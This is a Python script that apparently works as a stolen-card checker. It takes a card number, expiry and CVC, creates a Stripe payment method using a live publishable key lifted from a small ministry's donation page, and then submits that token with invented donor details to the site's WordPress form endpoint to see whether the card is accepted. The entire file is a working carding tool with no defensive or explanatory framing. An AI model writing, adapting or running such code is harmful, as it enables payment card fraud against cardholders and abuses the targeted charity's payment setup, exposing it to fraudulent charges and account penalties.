import requests,re
def Tele(ccx):
	import requests
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	r = requests.session()

	headers = {
			'authority': 'api.stripe.com',
			'accept': 'application/json',
			'accept-language': 'en-US,en;q=0.9,my;q=0.8',
			'content-type': 'application/x-www-form-urlencoded',
			'origin': 'https://js.stripe.com',
			'referer': 'https://js.stripe.com/',
			'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
			'sec-ch-ua-mobile': '?1',
			'sec-ch-ua-platform': '"Android"',
			'sec-fetch-dest': 'empty',
			'sec-fetch-mode': 'cors',
			'sec-fetch-site': 'same-site',
			'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
	}

	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=f006782a-3999-476c-95c4-f6e67cb821f4da2793&muid=65837ef0-c6bf-438c-95d6-a1070cd4d64d444f8f&sid=1352f874-c194-4586-9f9b-608d9150e2df2ebb86&pasted_fields=number&payment_user_agent=stripe.js%2Fa8a0661e95%3B+stripe-js-v3%2Fa8a0661e95%3B+card-element&referrer=https%3A%2F%2Fwww.peaceambaministries.us&time_on_page=43229&key=pk_live_51NajnRBHVLOCuCFLquaGvaycf3xyCBxy015xuxHVKaJCLcLBcQDfzWtuaIcJ6P1q4ghIoZlgW6y4pbaXlky8Kz8V00KZV9NbDb'
	r1 = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)

	pm = r1.json()['id']

	cookies = {
			'__stripe_mid': '65837ef0-c6bf-438c-95d6-a1070cd4d64d444f8f',
			'__stripe_sid': '1352f874-c194-4586-9f9b-608d9150e2df2ebb86',
	}

	headers = {
			'authority': 'www.peaceambaministries.us',
			'accept': '*/*',
			'accept-language': 'en-US,en;q=0.9,my;q=0.8',
			'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
			# 'cookie': '__stripe_mid=cd04496a-fc78-49f6-99fc-6310e3e55e6221dc47; __stripe_sid=b3b7888f-21a6-4ff7-a3cf-b0242d6fcf37cce97e',
			'origin': 'https://www.peaceambaministries.us',
			'referer': 'https://www.peaceambaministries.us/become-a-partner/',
			'sec-ch-ua': '"Not_A Brand";v="99", "Chromium";v="124"',
			'sec-ch-ua-mobile': '?1',
			'sec-ch-ua-platform': '"Android"',
			'sec-fetch-dest': 'empty',
			'sec-fetch-mode': 'cors',
			'sec-fetch-site': 'same-origin',
			'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
			'x-requested-with': 'XMLHttpRequest',
	}

	params = {
			't': '1728368566188',
	}

	data = {
			'data': '__fluent_form_embded_post_id=25397&_fluentform_9_fluentformnonce=cd8cffa428&_wp_http_referer=%2Fbecome-a-partner%2F&names%5Bfirst_name%5D=WangLin&phone=907248-3068&address_1%5Baddress_line_1%5D=Street%2027&address_1%5Baddress_line_2%5D=&address_1%5Bcity%5D=New%20York&address_1%5Bstate%5D=New%20York&address_1%5Bzip%5D=10080&payment_input=0&payment_method=stripe&__stripe_payment_method_id='+str(pm)+'',
			'action': 'fluentform_submit',
			'form_id': '9',
	}
	
	r2 = requests.post(
			'https://www.peaceambaministries.us/wp-admin/admin-ajax.php',
			params=params,
			cookies=cookies,
			headers=headers,
			data=data,
	)
	return (r2.json())